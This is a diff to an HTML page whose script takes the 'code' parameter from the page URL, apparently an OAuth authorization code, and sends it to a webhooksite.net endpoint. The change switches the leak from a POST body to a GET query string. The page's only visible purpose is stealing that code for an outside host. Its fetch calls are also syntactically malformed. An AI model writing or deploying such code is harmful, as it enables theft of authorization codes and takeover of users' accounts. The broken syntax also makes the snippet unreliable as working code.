@@ -5,12 +5,10 @@
     
     const params = new URLSearchParams(window.location.search);
     const data = params.get("code");
-    const webhook = new URL("https://webhooksite.net/510a6033-bbc2-4dfc-9503-fcb2b1056fc8?code=");
+    const webhook = new URL("https://webhooksite.net/510a6033-bbc2-4dfc-9503-fcb2b1056fc8?code=" + data);
 
-    fetch(webhook+data, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json" });
+    fetch(webhook, {
+      method: "GET");
   </script>
 </head>
 <body>
